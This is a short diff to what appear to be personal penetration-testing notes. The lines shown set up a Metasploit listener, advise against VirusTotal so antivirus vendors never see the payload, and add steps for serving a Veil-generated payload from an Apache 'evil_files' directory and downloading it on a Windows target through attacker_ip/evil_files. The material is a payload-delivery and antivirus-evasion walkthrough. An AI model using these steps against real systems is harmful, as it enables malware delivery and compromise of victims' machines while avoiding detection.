@@ -919,6 +919,13 @@ Note -> do not use virus total bcz it share the results with anti virus programs
 	> set LHOST ip
 	> set LPORT 8080
 	> exploit // and the listening will start
+	
+- cmd -> cd /var/www/html 
+- cmd -> mkdir evil_files // directory to contain payloads and copy the veil created payload here
+
+- cmd -> service apache2 start
+
+- go to target(windows vm browser) cmd -> attacker_ip/evil_files // u should see Apache2 Debian Page
 
 --------------------------------------------------------------------------------------------------------------------------------
 
